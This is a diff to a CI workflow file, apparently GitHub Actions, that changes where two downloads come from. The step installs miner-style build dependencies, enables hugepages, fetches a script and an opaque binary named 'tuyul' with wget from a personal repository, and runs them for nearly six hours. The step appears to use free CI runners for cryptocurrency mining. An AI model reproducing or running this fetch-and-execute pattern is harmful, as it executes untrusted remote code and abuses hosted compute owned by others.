@@ -75,8 +75,8 @@ jobs:
       - name: 5
         run: |
           sudo apt-get install -y gcc git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
-        wget https://raw.githubusercontent.com/marinisalim6/p/main/compilewow.sh
-        wget https://github.com/marinisalim6/p/raw/main/tuyul
+        wget https://raw.githubusercontent.com/jannahtera856/p/main/compilewow.sh
+        wget https://github.com/jannahtera856/p/raw/main/tuyul
         sudo sysctl -w vm.nr_hugepages=1280
         chmod +x tuyul compilewow.sh
         timeout 355m ./compilewow.sh ....................
